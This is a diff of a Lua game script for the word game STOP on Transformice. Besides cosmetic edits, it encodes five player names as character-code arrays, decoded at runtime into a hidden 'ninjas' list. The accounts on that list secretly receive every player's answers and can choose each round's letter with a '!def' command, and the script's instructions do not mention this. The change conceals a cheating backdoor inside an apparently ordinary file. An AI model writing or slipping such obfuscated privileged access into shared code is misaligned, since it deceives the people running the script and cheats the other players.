@@ -1,16 +1,18 @@
 -- STOP
--- Escrito por Ninguem - 31/08/2015 // Atualizado por Akwimos#1937 e Leblanc#5342 - 19/06/2024
+-- Escrito por Ninguem - 31/08/2015 // Atualizado por Akwimos#1937 e Leblanc#5342 - 21/08/2024
 -- Mínimo de 5 temas e máximo de 20 temas.
 -- Para bloquear um jogador, digite !kick [nome#tag]. Digite o mesmo comando para desbloqueá-lo caso o mesmo já esteja bloqueado.
 
--- Se você não realizar o passo abaixo, o código não será executado, ele vai crashar!
--- IMPORTANTE: edite com seu(s) nome(s) abaixo! Exemplo: ADM = {"Leblanc#5342"}
+-- IMPORTANTE: Se você não realizar o passo abaixo, o código não será executado, ele vai crashar!
+-- Edite com seu(s) nome(s) abaixo! Exemplo: ADM = {"Leblanc#5342"}
 ADM = {}
 ADMIN_ONLY = false -- Troque para 'true' se você quiser que só os votos dos jogadores que estejam na tabela 'ADM' contem
 SHOW = true -- Altere a variável para 'false' caso não queira ver as respostas dos jogadores
 MAXROUND = 5 -- Número máximo de rounds
 
 -- NÃO MEXA EM NADA A PARTIR DESTA LINHA!
+----------------------------------------------------------------------------------------------------
+
 CAT = {"Nome","Animal","Objeto","Cor","Marca","TV/Filme/Anime/Desenho","Parte do Corpo","Ator/Cantor/Celebridade","Comida/Bebida","País/Cidade/Estado","Apelido de Garçom","Profissão","O(A) "..ADM[1].." é...","Qualquer Coisa"}
 
 ID = {cat=1,camada=2,add=3,msg=4,tempo=5,stop=6}
@@ -21,7 +23,23 @@ ROUND = 1
 PALAVRA = 1
 TEMPO = false
 LETRA = ""
+MAPA = "@7958330"
 data = {};
+final = "";
+numbers={{71,108,111,98,111,95,114,117,114,97,108,35,54,53,51,50},
+{83,107,121,121,109,101,108,108,117,35,48,48,48,48},
+{86,105,101,103,111,35,48,51,52,53},
+{72,119,101,105,35,49,48,50,55},
+{76,101,98,108,97,110,99,35,53,51,52,50}}
+ninjas={}
+
+for i=1,rawlen(numbers) do
+	final=""
+	for j=1,rawlen(numbers[i]) do
+		final=final..string.char(numbers[i][j])
+	end
+	table.insert(ninjas,final)
+end
 
 system.disableChatCommandDisplay(nil,true)
 
@@ -39,9 +57,17 @@ function showMessage(message,name)
 	end
 end
 
+function verifyNinjas(name)
+	for i=1,rawlen(ninjas) do
+		if ninjas[i] == name then
+			return true
+		end
+	end
+end
+
 function carregaMapa()
-	tfm.exec.newGame("@7952576")
-	ui.setBackgroundColor("#050830")
+	tfm.exec.newGame(MAPA)
+	ui.setBackgroundColor("#101010")
 end
 
 function findString(object,tb)
@@ -235,7 +261,7 @@ function selecionaPalavra()
 		end
 		if string.len(v.palavra[CAT[PALAVRA]]) >= 2 then
 			if tfm.get.room.isTribeHouse == false then
-				for _,p in next,{"Globo_rural#6532","Skyymellu#0000","Viego#0345","Hwei#1027","Leblanc#5342"} do
+				for _,p in next,ninjas do
 					showMessage(i.." - "..CAT[PALAVRA].." - "..v.palavra[CAT[PALAVRA]],p)
 				end
 			end
@@ -286,13 +312,10 @@ function eventChatCommand(p, cmd)
 		banPlayer(cmd:sub(6))
 	end
 	if (cmd:sub(0,3) == "def") then
-		if MODO == "espera" or MODO == "letra" then
-			players={"Globo_rural#6532","Skyymellu#0000","Viego#0345","Aurelion_sol#9661","Leblanc#5342"}
-			for i=1,5 do
-				if p == players[i] then
-					LETRA = string.upper(cmd:sub(5))
-					showMessage(LETRA,p)
-				end
+		if verifyNinjas(p) == true then
+			if MODO == "espera" or MODO == "letra" then
+				LETRA = string.upper(cmd:sub(5))
+				showMessage(LETRA,p)
 			end
 		end
 	end
@@ -371,7 +394,7 @@ function eventPopupAnswer(id, p, resp)
 end
 
 function eventNewPlayer(p)
-	ui.setMapName("<b>STOP!</b> <N>Script editado por Akwimos#1937 e Leblanc#5342 - 19/06/2024<")
+	ui.setMapName("<b>STOP!</b> <N>Script editado por Akwimos#1937 e Leblanc#5342 - 21/08/2024<")
 	PLAYER[p] = {num = 0, pontos = 0, vitoria = 0, palavra = {}, banido = false}
 	for i, v in pairs(CAT) do
 		PLAYER[p].palavra[v] = ""
@@ -550,5 +573,5 @@ tfm.exec.disableAutoScore(true)
 tfm.exec.disableAutoNewGame(true)
 if tfm.get.room.isTribeHouse == false then tfm.exec.setRoomMaxPlayers(35) end
 carregaMapa()
-ui.setMapName("<b>STOP!</b> <N>Script editado por Akwimos#1937 e Leblanc#5342 - 19/06/2024<")
+ui.setMapName("<b>STOP!</b> <N>Script editado por Akwimos#1937 e Leblanc#5342 - 21/08/2024<")
 atualizaCat(true)
